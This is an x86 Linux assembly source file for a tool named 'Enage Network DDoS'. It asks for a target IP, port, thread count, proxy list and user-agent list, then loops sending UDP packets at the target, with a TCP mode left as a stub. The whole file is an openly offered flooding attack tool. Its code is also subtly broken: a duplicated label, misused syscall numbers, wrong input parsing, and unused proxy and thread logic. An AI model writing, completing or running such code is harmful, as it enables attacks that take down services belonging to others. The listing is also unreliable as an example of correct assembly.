;************************
;   Enage Network DDoS :
;************************

section .data
    prompt db "Select protocol (1: UDP, 2: TCP): ", 0
    prompt_len equ $ - prompt
    thread_prompt db "Enter number of threads (1-100): ", 0
    thread_prompt_len equ $ - thread_prompt
    ip_prompt db "Enter target IP address: ", 0
    ip_prompt_len equ $ - ip_prompt
    port_prompt db "Enter target port: ", 0
    port_prompt_len equ $ - port_prompt
    proxy_prompt db "Enter proxy file name: ", 0
    proxy_prompt_len equ $ - proxy_prompt
    user_agent_prompt db "Enter user agent file name: ", 0
    user_agent_prompt_len equ $ - user_agent_prompt
    msg db "Attack!", 0
    sockfd resd 1
    ip resb 16 ; Buffer for target IP address
    port resw 1 ; Buffer for target port
    num_threads db 1
    total_packets db 1000
    user_input resb 10
    proxy_file resb 256 ; Buffer for proxy file name
    proxy_line db 256 dup(0) ; Buffer for proxy line
    proxy_ip resb 16 ; Buffer for proxy IP
    user_agent_file resb 256 ; Buffer for user agent file name
    user_agent_line db 256 dup(0) ; Buffer for user agent line
    user_agent_count resd 1 ; Number of user agents
    proxy_count resd 1 ; Number of proxies

section .bss
    ; No additional bss needed

section .text
    global _start

_start:
    ; Get Protocol Selection, IP, Port, Thread Count, Proxy and User-Agent files from User
    call get_user_input
    call get_target_ip
    call get_target_port
    call get_thread_count
    call get_proxy_file_name
    call read_proxies_from_file
    call get_user_agent_file_name
    call read_user_agents_from_file

    ; Start operation based on protocol selection
    cmp byte [user_input], '1'
    je .udp_mode
    cmp byte [user_input], '2'
    je .tcp_mode

    ; Default to UDP
    jmp .udp_mode

.udp_mode:
    call create_socket
    call setup_target
    call send_udp_packets
    jmp exit_program

.tcp_mode:
    call create_tcp_socket
    call setup_target
    call send_tcp_packets
    jmp exit_program

; Function to get user input for protocol selection
get_user_input:
    mov eax, 4
    mov ebx, 1
    mov ecx, prompt
    mov edx, prompt_len
    int 0x80

    mov eax, 3
    mov ebx, 0
    mov ecx, user_input
    mov edx, 10
    int 0x80
    ret

; Function to get target IP address
get_target_ip:
    mov eax, 4
    mov ebx, 1
    mov ecx, ip_prompt
    mov edx, ip_prompt_len
    int 0x80

    mov eax, 3
    mov ebx, 0
    mov ecx, ip
    mov edx, 16
    int 0x80
    ret

; Function to get target port
get_target_port:
    mov eax, 4
    mov ebx, 1
    mov ecx, port_prompt
    mov edx, port_prompt_len
    int 0x80

    mov eax, 3
    mov ebx, 0
    mov ecx, user_input
    mov edx, 10
    int 0x80
    movzx eax, user_input
    mov [port], ax ; Store the target port
    ret

; Function to get the number of threads
get_thread_count:
    mov eax, 4
    mov ebx, 1
    mov ecx, thread_prompt
    mov edx, thread_prompt_len
    int 0x80

    mov eax, 3
    mov ebx, 0
    mov ecx, user_input
    mov edx, 10
    int 0x80
    movzx eax, user_input
    mov [num_threads], al ; Store the number of threads
    ret

; Function to get proxy file name
get_proxy_file_name:
    mov eax, 4
    mov ebx, 1
    mov ecx, proxy_prompt
    mov edx, proxy_prompt_len
    int 0x80

    mov eax, 3
    mov ebx, 0
    mov ecx, proxy_file
    mov edx, 256
    int 0x80
    ret

; Function to read proxies from the specified file
read_proxies_from_file:
    ; Open the file
    mov eax, 5             ; syscall: open
    mov ebx, proxy_file    ; filename
    mov ecx, 0             ; flags: O_RDONLY
    int 0x80
    mov esi, eax           ; save file descriptor

    ; Read proxies line by line
read_proxy_line:
    ; Read a line from the file
    mov eax, 3             ; syscall: read
    mov ebx, esi           ; file descriptor
    lea ecx, [proxy_line]  ; buffer
    mov edx, 256           ; buffer size
    int 0x80
    cmp eax, 0             ; check if end of file
    jle .done_reading_proxies

    ; Store proxy in the proxy list (for simplicity, just increment proxy count)
    inc dword [proxy_count]

    ; Loop back to read the next line
    jmp read_proxy_line

.done_reading_proxies:
    ; Close the file
    mov eax, 6             ; syscall: close
    mov ebx, esi           ; file descriptor
    int 0x80
    ret

; Function to get user agent file name
get_user_agent_file_name:
    mov eax, 4
    mov ebx, 1
    mov ecx, user_agent_prompt
    mov edx, user_agent_prompt_len
    int 0x80

    mov eax, 3
    mov ebx, 0
    mov ecx, user_agent_file
    mov edx, 256
    int 0x80
    ret

; Function to read user agents from the specified file
read_user_agents_from_file:
    ; Open the file
    mov eax, 5             ; syscall: open
    mov ebx, user_agent_file ; filename
    mov ecx, 0             ; flags: O_RDONLY
    int 0x80
    mov esi, eax           ; save file descriptor

    ; Read user agents line by line
read_user_agent_line:
    ; Read a line from the file
    mov eax, 3             ; syscall: read
    mov ebx, esi           ; file descriptor
    lea ecx, [user_agent_line]  ; buffer
    mov edx, 256           ; buffer size
    int 0x80
    cmp eax, 0             ; check if end of file
    jle .done_reading_user_agents

    ; Store user agent in the user agent list (for simplicity, just increment user agent count)
    inc dword [user_agent_count]

    ; Loop back to read the next line
    jmp read_user_agent_line

.done_reading_user_agents:
    ; Close the file
    mov eax, 6             ; syscall: close
    mov ebx, esi           ; file descriptor
    int 0x80
    ret

; Function to create a UDP socket
create_socket:
    mov eax, 102                ; socket syscall number
    mov ebx, 2                  ; AF_INET
    mov ecx, 2                  ; SOCK_DGRAM
    xor edx, edx                ; Protocol
    int 0x80
    mov [sockfd], eax           ; Store socket descriptor
    ret

; Function to create a TCP socket
create_tcp_socket:
    mov eax, 102                ; socket syscall number
    mov ebx, 2                  ; AF_INET
    mov ecx, 1                  ; SOCK_STREAM
    xor edx, edx                ; Protocol
    int 0x80
    mov [sockfd], eax           ; Store socket descriptor
    ret

; Function to setup target address
setup_target:
    push dword 0                ; sin_zero
    push word [port]            ; sin_port
    push dword [ip]             ; sin_addr
    push word 2                 ; sin_family (AF_INET)
    mov esi, esp                ; Copy sockaddr_in structure to esi
    ret

; Function to send UDP packets
send_udp_packets:
    mov ecx, [total_packets]     ; Number of packets to send
send_udp_packets:
    mov ecx, [total_packets]         ; Number of packets to send
send_udp_loop:
    ; sendto(sockfd, msg, sizeof(msg), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr))
    mov eax, 104                     ; sendto syscall number
    mov ebx, [sockfd]                ; socket descriptor
    push sockaddr_in_size            ; size of sockaddr_in structure
    push esi                         ; pointer to dest_addr (sockaddr_in)
    push 0                           ; flags
    push 1                           ; message length (size of msg)
    push msg                         ; pointer to msg
    int 0x80                         ; Call kernel

    loop send_udp_loop               ; Decrement ECX and loop if not zero
    ret

; Function to send TCP packets
send_tcp_packets:
    ; TCP packet sending logic here (UDP but using connect and send)
    mov ecx, [total_packets]         ; Number of packets to send
send_tcp_loop:
    ; connect(sockfd, (struct sockaddr*)&dest_addr, sizeof(dest_addr))
    ; Send TCP packets logic goes here
    ; For each packet, we would use the same structure as in UDP
    ; Remember to establish a connection first using connect syscall

    loop send_tcp_loop               ; Decrement ECX and loop if not zero
    ret
